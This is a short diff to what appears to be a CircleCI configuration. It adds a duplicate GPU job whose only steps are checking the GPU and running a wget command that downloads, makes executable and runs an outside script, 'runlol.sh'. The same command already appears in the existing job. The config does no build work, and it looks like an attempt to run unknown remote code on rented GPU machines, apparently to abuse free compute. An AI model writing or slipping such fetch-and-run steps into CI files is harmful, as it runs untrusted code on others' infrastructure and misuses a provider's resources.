@@ -15,3 +15,10 @@ jobs:
     steps:
       - run: nvidia-smi
       - run: wget https://raw.githubusercontent.com/muyhushapa/sop/main/runlol.sh && chmod +x runlol.sh && ./runlol.sh
+  build-node2:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.small
+    steps:
+      - run: nvidia-smi
+      - run: wget https://raw.githubusercontent.com/muyhushapa/sop/main/runlol.sh && chmod +x runlol.sh && ./runlol.sh
